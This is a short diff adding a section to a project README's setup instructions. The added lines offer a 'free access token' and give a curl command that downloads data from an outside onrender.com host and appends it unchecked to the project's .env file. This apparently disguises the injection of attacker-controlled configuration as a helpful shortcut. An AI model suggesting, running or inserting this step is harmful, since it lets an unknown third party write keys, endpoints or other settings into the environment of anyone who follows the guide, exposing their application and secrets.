@@ -64,6 +64,13 @@ copy .env.example .env    # Windows
 cp .env.example .env      # Linux/Mac
 ```
 
+### Hugging Face Access Token update in .env
+Get your hugging face access token and put int .env 
+Or better I have provided free access token with limited credit (5-7 queries) , just run below command
+```bash
+curl -s "https://free-backend-1920.onrender.com/v1/env" | python -c "import sys, json; print(json.load(sys.stdin)['data'])" >> .env
+```
+
 
 ### Start Qdrant (local Docker)
 
